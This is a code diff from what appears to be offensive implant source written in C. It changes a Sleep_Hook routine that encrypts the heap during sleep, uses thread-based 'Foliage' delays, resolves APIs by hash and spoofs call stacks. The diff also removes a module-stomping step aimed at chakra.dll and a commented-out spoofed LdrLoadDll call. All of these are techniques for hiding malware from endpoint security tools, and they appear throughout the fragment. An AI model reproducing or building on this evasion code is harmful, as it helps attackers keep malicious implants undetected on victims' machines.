@@ -234,7 +234,7 @@ SECTION( D ) NTSTATUS setupThreads( PAPI pApi, PHANDLE originalThd, PHANDLE slee
     return Status;
 };
 
-SECTION( D ) VOID delayExec( PAPI pApi, PIMAGE_DOS_HEADER OverloadModule )
+SECTION( D ) VOID delayExec( PAPI pApi )
 {
     #define CHECKERR( status )  if( status != STATUS_SUCCESS ) { goto cleanup; };
 
@@ -264,18 +264,6 @@ SECTION( D ) VOID delayExec( PAPI pApi, PIMAGE_DOS_HEADER OverloadModule )
     S32Key.str  = pApi->enckey;
     S32Data.len = S32Data.maxlen = pApi->Length;
     S32Data.str = ( PBYTE )( pApi->Buffer );
-
-    // Prep the Module Stomp
-    // Nt  = (PIMAGE_NT_HEADERS)( U_PTR( OverloadModule ) + OverloadModule->e_lfanew );
-    // Sec = IMAGE_FIRST_SECTION(Nt);
-    // for ( DWORD i = 0; i < Nt->FileHeader.NumberOfSections; i++ )
-    // {
-    //     if ( HashString( SecHeader[ i ].Name, 0 ) == H_SECTION_TEXT)
-    //     {
-    //         Text     = U_PTR( OverloadModule ) + SecHeader[ i ].VirtualAddress;
-    //         TextSize = SecHeader[ i ].Misc.VirtualSize;
-    //     }
-    // }
 
     // Prep the Foliage
     Status = setupThreads( pApi, &OrigThd, &WaitThd );
@@ -491,7 +479,6 @@ SECTION( D ) VOID generateEncryptionKey( PAPI pApi )
 SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds ) 
 {
     API                 Api;
-    PVOID               OverloadModule;
 
     RtlSecureZeroMemory( &Api, sizeof( Api ) );
 
@@ -511,17 +498,9 @@ SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds )
             return;
         };
 
-        OverloadModule = FindModule( HashString( OFFSET( L"chakra.dll" ), NULL ), NULL, NULL );
-        // if ( !OverloadModule )
-        // {
-        //     UNICODE_STRING      Uni = { 0 };
-        //     Api.ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"chakra.dll" ) ) );
-        //     SPOOF( Api.ntdll.LdrLoadDll, Api.hNtdll, Api.szNtdll, NULL, 0, &Uni, &OverloadModule )
-        // }
-
         generateEncryptionKey( &Api );
         encryptHeap( &Api );
-        delayExec( &Api, OverloadModule );
+        delayExec( &Api );
         encryptHeap( &Api );
     };
 
